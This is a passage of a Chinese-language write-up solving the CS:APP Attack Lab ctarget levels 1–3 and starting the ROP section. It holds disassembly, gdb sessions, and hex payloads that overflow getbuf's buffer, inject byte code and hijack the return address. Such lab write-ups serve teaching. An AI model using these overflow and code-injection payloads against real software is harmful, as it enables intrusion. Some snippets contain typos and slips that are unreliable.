title="Level1"></a><strong>Level1</strong></h3><h4 id="test函数"><a href="#test函数" class="headerlink" title="test函数"></a>test函数</h4><p>这个函数是我们将攻击的代码. 我们通过 <code>getbuf</code> 函数输入一串字符, 理论上正常返回时会返回整型 <code>1</code> 储存在 <code>val</code>中 并打印, 退出. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test 函数的C语言表述</span></span><br><span class="line"><span class="number">1</span><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line">val = getbuf();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来观察汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;test 函数的汇编表述</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">    0x0000000000401968 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">    0x000000000040196c &lt;+4&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401971 &lt;+9&gt;:callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">    0x0000000000401976 &lt;+14&gt;:mov    %eax,%edx</span><br><span class="line">    0x0000000000401978 &lt;+16&gt;:mov    $0x403188,%esi</span><br><span class="line">    0x000000000040197d &lt;+21&gt;:mov    $0x1,%edi</span><br><span class="line">    0x0000000000401982 &lt;+26&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401987 &lt;+31&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x000000000040198c &lt;+36&gt;:add    $0x8,%rsp</span><br><span class="line">    0x0000000000401990 &lt;+40&gt;:retq</span><br></pre></td></tr></table></figure><p>我们注意&lt;+9&gt; 这一行, <code>callq</code> 函数的操作对象是一个地址, 目前这个地址是指向到 <code>getbuf</code>函数</p><p>在<code>getbuf</code>结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. </p><blockquote><p>事实上, 当我们在使用<code>callq</code>某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 <code>retq</code>指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.</p></blockquote><p>我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 <code>touch1</code>函数的开始地址, 称为目标地址.</p><p>于是任务变成了:</p><ol><li>找到堆栈中原地址的储存位置</li><li>确定目标地址的地址</li><li>将原地址替换为目标地址</li></ol><h4 id="getbuf-函数"><a href="#getbuf-函数" class="headerlink" title="getbuf 函数"></a>getbuf 函数</h4><p>我们可以看到它的C代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getbuf 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">GETs(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;getbuf()</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:retq</span><br></pre></td></tr></table></figure><p>我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. </p><p>这说明缓冲区大小即为0x28</p><blockquote><p>BUFF_SIZE 大小应该是与缓冲区是两个概念.</p><p>例如 教材3.10小节的代码. 实际上分配的字符数组为 <code>buf[8]</code>, 但是体现在汇编代码中就变成了<code>subq $24,%rsp</code> , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.</p></blockquote><p>在整个过程中栈的变化是这样的:</p><blockquote><p>假设在test函数的<code>callq</code>语句调用之前, 栈顶指针<code>$rsp</code> 为 0x666600, 当前执行语句 <code>$rip</code> 为0x401971</p><ol><li>调用<code>callq</code>语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 <code>$rsp</code>  变为0x666601</li><li>进入<code>getbuf</code>语句, 在<code>0x4017a8</code>处分配了0x28个栈, 此时栈顶指针为0x666629</li><li><code>getbuf</code>函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629</li><li>继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601</li><li><code>retq</code>语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.</li></ol><p>嗯……应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧…</p><p>因为栈指针是指向栈顶下一个地址的…</p></blockquote><p>不妨使用gdb的查看指令检验一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在 +12 设置一个断点</span><br><span class="line">&#x2F;&#x2F;事先输入的字符串为 &quot;abcdef&quot;</span><br><span class="line">(gdb) print (char*) ($rsp)</span><br><span class="line">$1 &#x3D; 0x5561dc78 &quot;abcdef&quot;</span><br><span class="line">&#x2F;&#x2F;可以看出, 堆栈的起始位置即储存了输入的字符串</span><br><span class="line"></span><br><span class="line">(gdb) x&#x2F;a ($rsp+0x28) </span><br><span class="line">0x5561dca0:0x401976 &lt;test+14&gt;</span><br><span class="line">&#x2F;&#x2F;可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址.</span><br></pre></td></tr></table></figure><p>那么我们现在只需要使用目标地址替换原地址即可.</p><h4 id="touch1-函数"><a href="#touch1-函数" class="headerlink" title="touch1 函数"></a>touch1 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;touch1 反汇编</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>显然目标地址就是 <code>0x4017c0</code></p><p>因此, 我们应当输入的数字如下:</p><blockquote><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>c0 17 40 00 00 00 00 00 00 00 </p></blockquote><p>上面的内容不能直接在<code>ctarget</code>运行时输入, 而要使用 <code>Hex2raw</code>工具处理. 具体请参看上面的  <code>Hex2raw</code> 讲解部分.</p><p>我们将上述材料存储在文件<code>in.txt</code>内, 并使用 <code>Hex2raw</code>工具将其转化为 二进制 文件并输入. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw  &lt;in.txt&gt; out</span><br><span class="line">.&#x2F;ctarget -i out -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure><p>说明我们已经过了第一关</p><hr><h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.</p><p>我们先来看touch2函数</p><h4 id="touch2-函数"><a href="#touch2-函数" class="headerlink" title="touch2 函数"></a>touch2 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//touch2 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (val == cookie)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val); </span><br><span class="line">      validate(<span class="number">2</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>,val); </span><br><span class="line">      fail(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;touch2 函数的汇编表述</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">    0x00000000004017ec &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">    0x00000000004017f0 &lt;+4&gt;:mov    %edi,%edx</span><br><span class="line">    0x00000000004017f2 &lt;+6&gt;:movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">    0x00000000004017fc &lt;+16&gt;:cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</span><br><span class="line">    0x0000000000401802 &lt;+22&gt;:jne    0x401824 &lt;touch2+56&gt;</span><br><span class="line">    0x0000000000401804 &lt;+24&gt;:mov    $0x4030e8,%esi</span><br><span class="line">    0x0000000000401809 &lt;+29&gt;:mov    $0x1,%edi</span><br><span class="line">    0x000000000040180e &lt;+34&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401813 &lt;+39&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401818 &lt;+44&gt;:mov    $0x2,%edi</span><br><span class="line">    0x000000000040181d &lt;+49&gt;:callq  0x401c8d &lt;validate&gt;</span><br><span class="line">    0x0000000000401822 &lt;+54&gt;:jmp    0x401842 &lt;touch2+86&gt;</span><br><span class="line">    0x0000000000401824 &lt;+56&gt;:mov    $0x403110,%esi</span><br><span class="line">    0x0000000000401829 &lt;+61&gt;:mov    $0x1,%edi</span><br><span class="line">    0x000000000040182e &lt;+66&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401833 &lt;+71&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401838 &lt;+76&gt;:mov    $0x2,%edi</span><br><span class="line">    0x000000000040183d &lt;+81&gt;:callq  0x401d4f &lt;fail&gt;</span><br><span class="line">    0x0000000000401842 &lt;+86&gt;:mov    $0x0,%edi</span><br><span class="line">    0x0000000000401847 &lt;+91&gt;:callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>这里注意一下 +4 行. <code>%edi</code> 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 <code>%edi</code>寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 所以我们需要将自己的代码注入进去后能够实际运行它们.</p><h4 id="注入代码的执行"><a href="#注入代码的执行" class="headerlink" title="注入代码的执行"></a>注入代码的执行</h4><p>具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.</p><p>也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;注入代码需要实现的功能</span><br><span class="line">&#x2F;&#x2F;这些保存在 touch2_tmp.s 中</span><br><span class="line">mov $0x59b997fa,%rdi&#x2F;&#x2F;将cookie写入%edi寄存器</span><br><span class="line">pushq $0x4017ec&#x2F;&#x2F;将touch2首地址推入栈顶</span><br><span class="line">retq&#x2F;&#x2F;retq在执行时,将跳转touch2函数</span><br></pre></td></tr></table></figure><p>通过使用Byte Codes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2_tmp.s &#x2F;&#x2F;使用汇编器生成二进制的可重定位目标程序touch2_tmp.o</span><br><span class="line">objdump -d touch2_tmp.o &gt;touch2_tmp.d&#x2F;&#x2F;使用objdump将目标文件得到中间文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面是中间文件touch2_tmp.d中的内容,有精间</span><br><span class="line">0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure><h4 id="最后的小处理"><a href="#最后的小处理" class="headerlink" title="最后的小处理"></a>最后的小处理</h4><p>我们还需要对最终的in2文件进行小小的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这是 in2.txt 文件中的内容</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode</p><p>4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28   个字符  <span style="background-color: #252525">不信你数数</span></p><p>第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.</p><p><strong>大功告成</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in2.txt&gt; out2</span><br><span class="line">.&#x2F;ctarget -i out2 -q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>第二关就过啦~~</p><hr><h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).</p><p>整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. </p><p>在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: <code>0x4018fa</code>, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.</p><p>基本分析完毕, 现在需要考虑的只剩:</p><ol><li>注入什么字符串?</li><li>将字符串注入在哪?</li></ol><h4 id="字符串注入内容"><a href="#字符串注入内容" class="headerlink" title="字符串注入内容"></a>字符串注入内容</h4><p>我们需要将cookie转化为字符串, 这里需要注意两点: </p><ol><li>每个字符占一个字节. 使用ASCII码表示</li><li>字符串的结尾需要使用<code>\0</code>结尾</li></ol><p>在Linux平台下, 执行<code>man ascii</code>命令可以获取ASCII码表, 对应的编码很容易对照获得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie 的ASCII表述</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><h4 id="字符串注入位置"><a href="#字符串注入位置" class="headerlink" title="字符串注入位置"></a>字符串注入位置</h4><p>这里比较坑. </p><p>我们看一下 hexmatch 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hexmatch C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">   <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>()%<span class="number">100</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">   <span class="keyword">return</span> strncmo(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. </p><p>那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据<strong>有可能</strong>被覆盖掉.</p><p>于是, 我们选择将数据写入test函数的栈帧中.</p><p><strong>存疑</strong>: 可不可以将数据写入栈的其他位置? 比如栈 120 处.</p><h4 id="字节代码的编写"><a href="#字节代码的编写" class="headerlink" title="字节代码的编写"></a>字节代码的编写</h4><p>根据以上分析, 我们已经能够写出需要注入的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi      &#x2F;&#x2F;将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78</span><br><span class="line">pushq $0x4018fa             &#x2F;&#x2F;touch3地址</span><br><span class="line">retq</span><br><span class="line">...补全缓冲区 28</span><br><span class="line">...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78</span><br><span class="line">...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3</p><p>第4行是填满缓冲区的, 1-4行总计28字节</p><p>缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.</p><p>test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8</p><h4 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>1-3: 执行代码</p><p>4-7: 填充</p><p>8: 执行代码的首地址</p><p>9: 字符串地址的首地址</p><p><strong>大功告成</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in3.txt&gt; out3</span><br><span class="line">.&#x2F;ctarget -i out3 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><hr><h2 id="题解-RTARGET"><a href="#题解-RTARGET" class="headerlink" title="题解: RTARGET"></a>题解: RTARGET</h2><p>我们在上一部分利用了缓冲区溢出, 从而劫持返回地址, 将地址返回至我们期望的地址. 除此之外我们还将代码注入进缓冲区, 并通过返回地址执行这段代码. 我们还注意到了在程序的运行的过程中可能存在的内存覆盖, 因此我们规避并选取适当的地方来储存数据.</p><p>上述手段被称为 <strong>代码注入攻击</strong> (code injection attack) 已经是”莫里斯蠕虫”时代的手法了, 现代编译器使用 <strong>地址空间布局随机化</strong>(Address space layout randomization, ASLR), 栈空间代码禁止执行(增加 “可执行” 的权限位) , 与<strong>金丝雀</strong>(Canary) 等多种手段防范代码注入攻击. 对于前两种防御手段, 黑客们使用了名为 <strong>面向返回编程</strong> (Return-oriented programming, ROP) 的技巧, 仅仅使用原有代码的部分碎片拼接成待执行的代码. </p><p>本题将学习ROP来进行代码攻击. 在此之前, 有必要讲解 <em>gadgetfarm</em></p><h3 id="Gadget-Farm-的使用"><a href="#Gadget-Farm-的使用" class="headerlink" title="Gadget Farm 的使用"></a>Gadget Farm 的使用</h3><p>在rtagret中包括了一系列函数,  里面包括的一系列字节码将被我们作为碎片(gadget) 进行拼接并使用. 这些函数被称为farm函数</p><p>我们可以拿到 farm 中的小gadgets:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump rtarget &gt; farm-dump.txt</span><br></pre></td></tr></table></figure><p> 得到的文件中只有一部分是我们需要的, 删去不必要的代码后, 最终拿到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 